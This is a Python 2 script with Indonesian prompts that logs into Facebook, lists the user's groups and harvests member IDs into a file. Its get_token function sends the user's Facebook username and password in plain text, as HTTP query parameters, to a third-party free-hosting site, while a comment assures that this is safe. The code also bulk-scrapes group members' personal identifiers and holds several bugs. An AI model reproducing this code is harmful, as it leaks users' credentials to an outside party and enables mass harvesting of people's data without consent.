from os import system
import getpass
import requests
import sys
reload(sys)
sys.setdefaultencoding('utf8')
hapus = system("clear")
class fb(object):
    def __init__(self, token):
        self.__token = token
        self.__datas = {}
        self.__urls = {"user":"https://graph.facebook.com/v3.2/me",
                       "groups":"https://graph.facebook.com/v3.2/100007874343811/groups?access_token={}&pretty=0&fields=name,member_count,administrator,privacy,id&limit={}",
                       "mem": "https://graph.facebook.com/v3.2/{}/members?access_token={}&limit={}"}
    def __session(self, url):
        req = requests.get(url).json()
        return req
    def search_groups(self, limmit):
        groups_list = []
        id = []
        privacy = []
        admin = []
        member_count = []
        try:
            groups = self.__session(self.__urls["groups"].format(self.__token, limmit))
            for details in groups["data"]:
                # print details["name"]
                # print details["member_count"]
                # print details["id"]
                # print details["privacy"]
                # print details["administrator"]
                groups_list.append(details["name"])
                member_count.append(details["member_count"])
                id.append(details["id"])
                privacy.append(details["privacy"])
                admin.append(details["administrator"])
            self.__datas.update({"groups": groups_list,
                                       "id": id,
                                       "privacy": privacy,
                                       "admin": admin,
                                       "member_count":member_count})
        except KeyError or TypeError:
            raise Exception("eeeeyyyy")
            exit(0)
    def view_groups(self):
        return self.__datas["groups"]
    def view_idgroups(self):
        return self.__datas["id"]
    def your_groups(self):
        return self.__datas["admin"]
    def privacy(self):
        return self.__datas["privacy"]
    def member_count(self):
        return self.__datas["member_count"]
    def pilihan(self, pilihan, limmit, Save=None):
        ops = (self.__datas["groups"][pilihan], self.__datas["id"][pilihan])
        print "\n[{}]".format(ops[0])
        id, hasil = self.member(ops[1], limmit)
        print hasil
        if Save is not None:
            for i in id:
                try:
                    self.save_file(file=Save, isi=i+"\n")
                except Exception ,e:
                    print e
    def details_groups(self):
        for i in range(0, len(self.view_idgroups())):
            print "[{}] Group: ".format(i) + self.view_groups()[i]
            print "    Jumlah Member: " + str(self.member_count()[i])
            if str(self.your_groups()[i]) != "True":
                print "    Status: Member"
            else:
                print "    Status: Admin"
            print "    id: "+ self.view_idgroups()[i]
            print "    Status Grub: "+ self.privacy()[i]
    def member(self, id , limmit):
        idmember = []
        count = 0
        datas = self.__session(self.__urls["mem"].format(id, self.__token, limmit))
        for i in datas["data"]:
            count += 1
            print count, i["id"] , i["name"]
            idmember.append(i["id"])
            # print "NAME: {} ID: {}".format(i["name"], i["id"])
        return (idmember, "Jumlah member: "+str(count))

    def save_file(self, file=None, isi = None):
        with open(file, "a+") as saving:
            saving.write(isi)
def banner():
    print "[ Created by Qiuby Zhukhi ]"
    print "[ Thansk to Dimas Imam Nawawi ]"

def get_token(user,pwd):
    # Refresh token by Dimas Imam Nawawi
    #token pasti aman (y)
    get_token = "http://dimaslanjaka.000webhostapp.com/instagram/refreshtoken.php?user={}&pass={}"
    print "[!]GET TOKEN_FACEBOOK[!]"
    acces_token = requests.get(get_token.format(user,pwd)).json()["access_token"]
    print "[!] SUCCES [!]"
    return acces_token

facebook = fb(get_token)
def menu():
    banner()
    session = {}
    while True:
        print "===== [ MENUS ] ====="
        menus = {1: "Search Groups (Must Login)",
                 2: "Get Acces_token (Must Login)",
                 3:"Exit"}
        for nomor , judul in menus.items():
            print str(nomor)+". "+judul
        try:
            ops = int(raw_input("Masukkan Pilihan: "))
            if ops == 1:
                hapus
                print menus[ops]
                if len(session.keys()) == 2:
                    user = session["user"]
                    paswd = session["paswd"]
                else:
                    print "But your must login!"
                    user = raw_input("username: ")
                    paswd = raw_input("password: ")
                    session.update({"user":user, "paswd": paswd})
                ok = get_token(user, paswd)
                facebook = fb(ok)
                facebook.search_groups(200)
                facebook.details_groups()
                print "== [ SUB MENUS ] =="
                menus = {1: "Get ID Member Groups ",
                         2: "Multi ID Member Groups (Cooming Soon)",
                         3: "GET ALL MEMBERS (Cooming Soon)"}
                for nomor, judul in menus.items():
                    print str(nomor)+". "+judul
                ops = int(raw_input("> "))
                if ops == 1:
                    print "Masukkan Nomor Group yang berada diantara tanda [], ex: 1 "
                    group = int(raw_input("Nomor grup: "))
                    print "Masukkan Jumlah angka Member yang akan diambil ex: 200 orang"
                    count = int(raw_input("Jumlah member: "))
                    hapus
                    file = "grab.txt"
                    facebook.pilihan(limmit=count,pilihan=group, Save=file)
                elif ops == 2 :
                    print "NOB"
                    break
                elif ops == 3 :
                    print "NOB"
                    break
                else:
                    "Melampaui Batas"
                pass
            elif ops == 2:
                print menus[ops]
                print "Please Login, take save your Acces Token. "
                print "This Token is Permanently"
                user = raw_input("username: ")
                paswd = raw_input("password: ")
                ok = get_token(user, paswd)
                print ok
                break
            elif ops == 3:
                exit(0)
            else:
                print "Mungkin nomor yang kau masukan belum ada"
        except KeyError or TypeError:
            print "Oops..."
        except ValueError:
            print "Oops..."

if __name__ == '__main__':
    menu()